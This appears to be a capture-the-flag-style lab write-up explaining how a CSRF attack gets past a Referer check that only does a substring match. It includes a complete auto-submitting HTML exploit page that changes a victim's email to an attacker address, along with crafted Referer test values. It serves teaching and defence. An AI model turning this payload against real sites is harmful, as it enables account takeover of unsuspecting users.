# Lab 12: CSRF with broken Referer validation

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The server requires a `Referer` and checks it, but the matching logic is a loose substring check.

## Exploit

The server accepts the request as long as the lab domain appears **anywhere** in the Referer. Put the lab domain in the exploit page's own query string, and force the full Referer to be sent.

```html
<head>
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <form id="csrf-form" action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    history.pushState("", "", "/?LAB-ID.web-security-academy.net");
    document.getElementById('csrf-form').submit();
  </script>
</body>
```

## Why it works

Two parts combine:

1. **Substring validation** - the server checks the lab domain is present somewhere in the Referer, not that it is the actual origin. `history.pushState` rewrites the exploit page URL to `/?LAB-ID.web-security-academy.net`, so the Referer becomes `https://exploit-server.net/?LAB-ID.web-security-academy.net` - which contains the lab domain and passes.
2. **`unsafe-url` referrer policy** - browsers trim the path and query from cross-origin Referers by default, which would strip the crafted query string. `<meta name="referrer" content="unsafe-url">` forces the full URL to be sent, keeping the lab domain in the Referer.

## Confirming the flaw

In Repeater, a Referer of `https://attacker.com` is rejected, but `https://attacker.com?LAB-ID.web-security-academy.net` is accepted - proving the check is a substring match.

## Takeaway

Referer validation must parse the URL and check the origin/host, not run a substring search. A substring check is trivially satisfied by placing the expected domain in an attacker-controlled part of the URL, such as the query string.
